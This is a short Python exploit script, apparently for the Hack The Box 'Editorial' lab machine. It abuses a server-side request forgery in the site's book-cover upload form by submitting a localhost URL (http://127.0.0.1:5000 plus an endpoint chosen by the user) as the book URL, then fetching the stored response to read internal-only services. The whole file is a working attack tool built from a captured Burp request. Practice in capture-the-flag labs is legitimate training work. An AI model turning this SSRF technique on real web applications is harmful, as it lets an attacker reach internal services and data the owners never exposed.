#!/usr/bin/python3
import requests
import argparse


def get_arguments():
    parser = argparse.ArgumentParser(description='Get info in webpage.')
    
    # Add arguments
    parser.add_argument('-e' ,'--endpoint', type=str, help='Endpoint to make the request', required=True)
    
    return parser.parse_args()


def check_endpoint(endpoint: str)->str:
    if endpoint.startswith('/'):
        return endpoint
    return '/'+endpoint


def main()->None:
    # Get arguments from user
    args = get_arguments()
    # Set info for HTTP Request
    burp0_url = "http://editorial.htb/upload-cover"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=---------------------------1575085794932368148323839479", "Origin": "http://editorial.htb", "DNT": "1", "Connection": "close", "Referer": "http://editorial.htb/upload"}
    url_request = f'http://127.0.0.1:5000{check_endpoint(args.endpoint)}'
    print(f"[+] Making request to {url_request!r}...")
    burp0_data = f"-----------------------------1575085794932368148323839479\r\nContent-Disposition: form-data; name=\"bookurl\"\r\n\r\n{url_request}\r\n-----------------------------1575085794932368148323839479\r\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------1575085794932368148323839479--\r\n"
    r_post = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    url = r_post.text.strip()
    request_url = f'http://editorial.htb/{url}'
    print(f"[+] Attempting request to {request_url!r}...")
    r_get = requests.get(request_url, headers=burp0_headers)
    print("[+] Output is:")
    print(r_get.text)


if __name__ == "__main__":
    main()
